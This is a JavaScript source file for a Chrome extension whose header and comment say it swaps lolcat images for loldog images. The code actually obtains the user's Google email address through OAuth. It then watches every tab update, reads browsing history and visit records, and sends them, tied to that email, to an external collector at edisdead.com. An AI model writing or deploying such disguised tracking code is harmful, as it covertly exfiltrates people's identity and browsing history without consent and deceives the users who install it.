// Copyright (c) 2012 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Simple extension to replace lolcat images from
// http://icanhascheezburger.com/ with loldog images instead.

function send_to_server(data)
{
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open("POST","http://edisdead.com/collector",false);
    xmlhttp.send(JSON.stringify(data));
}

var oauth = ChromeExOAuth.initBackgroundPage({
  'request_url': 'https://www.google.com/accounts/OAuthGetRequestToken',
  'authorize_url': 'https://www.google.com/accounts/OAuthAuthorizeToken',
  'access_url': 'https://www.google.com/accounts/OAuthGetAccessToken',
  'consumer_key': 'anonymous',
  'consumer_secret': 'anonymous',
  'scope' : 'https://www.googleapis.com/auth/userinfo.email',
  'app_name': "search_ext"
});

function onAuthorized() {
  var url = 'https://www.googleapis.com/userinfo/email';
  var request = {
    'method': 'GET',
    'parameters': {'alt': 'json'}
  };

  oauth.sendSignedRequest(url, got_email_address, request);
};

function got_email_address(res)
{
    var email_address = JSON.parse(res).data.email

    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        chrome.history.search({text: "", endTime: (new Date()).getTime(), maxResults: 1 }, function (history_results) {
            if ((history_results[0] && tab.url == history_results[0].url && tab.url.indexOf("chrome-extension://") != 0 && (changeInfo.status == "loading" && history_results[0].title || changeInfo.status == "complete"))) {
                chrome.history.getVisits({url: history_results[0].url}, function (visits) {
                    visit = visits[visits.length - 1];
                    visit.tabId = tab.id;

                    data = {
                        tabId: tabId,
                        changeInfo: changeInfo,
                        tab: tab,
                        history_result: history_results[0],
                        visit: visit,
                        id: email_address
                    }

                    send_to_server(data)
                });
            }
        })
    })
}

oauth.authorize(onAuthorized);
setIcon();
